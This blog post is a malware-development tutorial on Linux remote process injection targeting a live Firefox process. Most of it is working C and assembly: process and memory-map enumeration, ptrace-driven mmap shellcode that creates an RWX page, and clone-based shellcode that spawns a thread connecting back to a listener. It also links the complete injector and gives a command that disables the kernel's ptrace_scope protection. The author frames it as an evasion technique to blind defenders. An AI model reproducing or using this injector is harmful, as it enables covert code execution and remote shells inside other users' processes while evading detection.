---
layout: post
title: "Linux Remote Process Injection: (Injecting into a Firefox Browser Process)"
---

This blog will cover **Remote Process Injection** in Linux; a common evasion technique popular in the Windows Malware world. The aim will be to write an injector that injects into another remote process and for the purpose of this blog, the chosen victim process will be **Firefox**. 

For a simple **Windows Process Injection** technique, a process is somewhat able to map a new memory on behalf of another remote process via `VirtualAllocEx` and has the ability to read and write into this memory region and at the same time have the ability to create a thread that will run in the context of that remote process via `CreateRemoteThread`.

**Linux Process Injection** is completely different in that we aren't provided with such interesting APIs *(I bet this is mentioned alot in other blog posts)*. In this post we will emulate the behaviour of the above mentioned Windows Process Injection technique by combining `ptrace`, `mmap` and the `clone` system calls to inject into a live Firefox Process.

The **usage** and **knowledge** of the `ptrace` system call for simple code injection is needed but not required. A detailed description is as provided [here](https://mutur4.github.io/posts/linux-malware-development/process-injection)

### Process-Enumeration

**Process Enumeration** is key in process injection since we want to find a suitable process where we can inject our code. This is helpful in finding a process owned by us *(same uid)* and also having a fail-safe when an injection into another process fails. 

Linux Processes can be enumerated by parsing the `/proc` directory and looking for 'numbered' directories. For example, a process with  pid of `1337` will have its information stored at `/proc/1337/`. 

The `UID` of the user that owns the process is stored in the `/proc/<PID>/status` file as shown for an example process below.

![Process UID](https://i.imgur.com/qlZIWWl.png)
 
The following `C` code snippet will enumerate all processes to check for a valid **Firefox** process that shares the same `UID` as the injecting process `getuid()`. The information about this process is stored in a struct variable that will come in handly later when we initiate code injection.

> The code snippet below is compatible in that it can be modified to inject into any chosen process of your chosing other than Firefox or automatically left to inject into a random(ly) chosen process that shares the same `UID` as the injector.

```c
PPROCESS enumProcs(){
        PPROCESS head = NULL;

        DIR *dir = opendir("/proc");

        if(!dir) return NULL;

        struct dirent *e;

        //This is used to return all the live processes (PIDz)
        while((e=readdir(dir)) != NULL){
                if(!atoi(e->d_name) || e->d_type != DT_DIR) continue;
                //Determine the owner of the process and compare this to ours

                char path[CMDLINESZ];
                snprintf(path, sizeof(path), "/proc/%s/status", e->d_name);

                //read this file to find the process id 

                char buffer[CMDLINESZ * 2];

                int fd = open(path, O_RDONLY);
                if (fd < 0) { close(fd); continue; }

                int readsz = read(fd, buffer, sizeof(buffer));

                if(readsz < 0) continue;
                char *needle = strstr(buffer, DELIM);
                int uid = atoi(strtok(needle+strlen(DELIM), "\t"));

                //if this process is not owned by us; continue to the next process
                if(uid != getuid()) continue;

                memset(path, 0, sizeof(path)); memset(buffer, 0, sizeof(buffer)); close(fd);
                snprintf(path, sizeof(path), "/proc/%s/cmdline", e->d_name);

                fd = open(path, O_RDONLY);
                if(fd < 0){ close(fd); closedir(dir); return NULL; }

                readsz = read(fd, buffer, sizeof(buffer));
                if(readsz <= 0) continue;

                //This is option used to search for a specific process in memory
                if(strstr(buffer, "firefox") == NULL) continue;
                PPROCESS process = (PPROCESS) malloc(sizeof(PROCESS));
                memset(process, 0, sizeof(PROCESS));

                if(process == NULL) continue;

                //copy the details in memory
                process->pid = atoi(e->d_name);
                strncpy(process->proc_name, buffer, CMDLINESZ);

                //initiate process injection
                if(processInject(process) == 0){
                        free(process); continue;
                }

                head = process;
                break;
        }
        closedir(dir);
        return head;
}
```

### Address-Space Enumeration 

After a suitable remote process is enumerated and returned *(in this case our FireFox Process)*, we need to enumerate its **Virtual Address Space** to find an address range that is executable `(rwp)?x`. This address is returned by parsing and reading the `/proc/<pid>/maps` file. 

> code-injection happens via `ptrace` that does not necessarily need a writable/readable memory block to perform its actions. 

The following `C` source code snippet performs this enumeration and returns an executable address range that is searched via the `strstr` function.  

```c
PADDRESS enumAddress(pid_t pid){
        char filename[CMDLINESZ];
        FILE *fp;
        unsigned char line[1024];
        unsigned char str[20], perms[0x5];

        PADDRESS paddr = (PADDRESS) calloc(1, sizeof(ADDRESS));


        snprintf(filename, sizeof(filename), "/proc/%d/maps", pid);
        fprintf(stdout, "[+] Parsing: %s\n", filename);

        fp = fopen(filename, "r");
        if (fp == NULL){fprintf(stderr, "[!] Error Opening: %s\n\n", filename); goto end;}

        while(fgets(line, sizeof(line), fp) != NULL){
                sscanf(line, "%lx-%*lx %s %*s", &paddr->start_address, perms);
                if(strstr(perms, "x")){ break; }
        }


        return paddr;

end:
        return NULL;
}
```

### Remote Memory Mapping

A new allocated memory map in the **Virtual Address Space** of the remote process is required for the following reasons:

- This will pevent overwriting existing data in the memory of the remote process that could affect the proper execution of that remote process. 
- An **executable** page for code injection with no length restrictions limiting the second-staged payload (shellcode).  

For the allocation of this page, we need a first *stage-payload* that will be executed by the remote process to allocate memory. The executable page/memory returned by the above `enumAddress` function will be used for the execution of the following shellcode that uses `mmap` to map a new `RWX` page.

```asm
push 0x22
pop rcx

push 0xffffffffffffffff
pop r8

xor r9d, r9d;
xor esi, esi
xor rdi, rdi

push 0x7
pop rdx

mov esi, 0x01010101
xor esi, 0x01010101

push 0x9
pop rax

syscall ; mmap(void *addr, size_t len, int prot, int flags, int fd, off_t offset)
int3 ; Raise a SIGTRAP signal 
```

> The above shellcode was written in a region that obviously had existing data and since we do not want to disrupt normal execution of the remote Firefox Process, we will create a backup and copy it back after the first stage-payload is done with execution.

The above shellcode is written to the returned address and the `rip` register is modified to point to this address for code execution. The `int3` instruction added at the end of the above shellcode is used as a trigger to let us know that our shellcode was succesfully executed. This is because of a returned `SIGTRAP` signal a technique described at [1].

The following code snippet performs the process described above.

```c
	PADDRESS address = enumAddress(pid);

        if(address == NULL) goto end;


        //Read OLD data from the return address above
        dataRead(pid, backup, address->start_address, sizeof(remote_mmap));
        fprintf(stderr, "[+] Data backup complete!\n\n");

        //shellcode injection into this address.
        dataWrite(pid, address->start_address, (unsigned long *) remote_mmap, sizeof(remote_mmap));

        //update RIP to point to our 'shellcode'

        regs.rip = (unsigned long) address->start_address;

        //set registers to the new registers
        ptrace(PTRACE_SETREGS, pid, NULL, &regs);

        //continue execution
        ptrace(PTRACE_CONT, pid, NULL, NULL);
        waitpid(pid, &status, WUNTRACED);

		//Wait for the SIGTRAP signal and check `rax` for the mapped page
        if(WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP){
                fprintf(stderr, "[+] Mmap() execution was success!!\n");

                ptrace(PTRACE_GETREGS, pid, NULL, &regs);
		
				if((long)regs.rax < 0) goto end;
		
                address->mmaped_address = (unsigned long *) regs.rax;
                fprintf(stderr, "[+] mmap'd address: %p\n", address->mmaped_address);

                goto shellcodeExec;

        }
```
The memory address of the newly allocated `(RWX)` region is returned to be used in the second-stage payload. 

### Remote Code Execution 

The second-staged payload *(emulating `CreateRemoteThread`)* can now be written into the newly allocated page for execution. The aim was to come up with a shellcode that would not affect the execution of the remote process at all cost and should be able to run as its own separate **process** or **thread**. 

The `clone` syscall is interesting because it can be used to implement both `threads` *(light-weight processes)* and *child processes* based on arguments pass to it *i.e* `CLONE_VM`. 


The following is part of the shellcode used to emulate `CreateRemoteThread` by spawning a remote thread that connect's back to an attacker's machine for **Remote Code Execution**. 

```asm
xor rdi, rdi;
or rdi, 0x800100 ;CLONE_UNTRACED | CLONE_VM

xor rsi, rsi
xor rdx, rdx
xor rcx, rcx
xor r8, r8

push 0x38
pop rax
syscall; clone(unsigned long clone_flags, unsigned long newsp, void *parent_id, void *child_tid, unsigned int tid)
	
cmp rax, 0x0
je <Connect-Back Shellcode address> ;JMP to connect-back shellcode
int3 ;raise a SIGTRAP
...
```
When the above shellcode is executed, the spawned thread *(that see'z a PID of `0`)* will execute the connect back shellcode connecting to `localhost:1337`. On the other hand, the parent proccess will raise a `SIGTRAP` letting us know that shellcode execution was a success, therefore allowing us to restore the back'd up data and resume execution of the remote process from _**ptrace's**_ `SIGSTOP`.

The following is the source code snippet that writes code into the new mmap'd region and returns execution back to the remote process. 

```c
shellcodeExec:
        /* ----- Write and Execute shellcode stored in the newly mmap'd region ----*/
        dataWrite(pid, address->mmaped_address, (unsigned long *) shellcode, sizeof(shellcode));

        memset(&regs, 0, sizeof(struct user_regs_struct));

        regs.rip = (unsigned long) address->mmaped_address;

        ptrace(PTRACE_SETREGS, pid, NULL, &regs);
        fprintf(stdout, "[+] Shellcode Execution @ %p\n", regs.rip);
        ptrace(PTRACE_CONT, pid, NULL, NULL);

        bzero(&status, sizeof(int));
        waitpid(pid, &status, WUNTRACED);

        if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) goto cleanup;


cleanup:
        dataWrite(pid, address->start_address, (unsigned long *)backup, sizeof(remote_mmap));

        //Restore Registers and execution back to the remote process

        ptrace(PTRACE_SETREGS, pid, NULL, &oldregs);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);

```

The following shows a successful execution of the injector injecting into a `Firefox` process. 

![Malware Injector](https://i.imgur.com/JlSK1Bp.png)

The following is the task-manager on Kali Linux showing an `sh` process as a child process of the above `Firefox` process with the same `PID`. This is similar to the common `cmd.exe` as a child process of an unsual suspicious process in Windows mainly an `IOC` for Remote Process Injection.


![Task Manager](https://i.imgur.com/EU2mEiu.png)

The following show as successful connect-back to ur listening port. 

![Connect Back](https://i.imgur.com/9qYboUS.png)

The complete code injection malware can be found [here](https://github.com/mutur4/Linux-Malware/blob/main/Process.Injection/firefox-injector.c). The `strstr` function inside the `EnumProcess` function can be modified to inject into a specific process that suits you needs or it can be commented out to let the injector inject into a random process. 

One of the major caveat's about `ptrace` is that there is a protection/mitigation where the Kernel is configured to prevent any process from calling `ptrace` on another process that it did not create via `fork`.If this feature is enabled the above process injector will not work. This can be temporarily disabled until the next boot using the following command. 

```bash
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
``` 


### Conclusion
This was a Linux Process Injection technique that was aimed at emulating the Windows `CreateRemoteThread` and `VirtualAllocEx` injection process to inject into a Live Firefox process for remote code execution. This is a nice evasion technique that should blind the BlueTeam. 

### References
 - [1] https://github.com/gaffe23/linux-inject

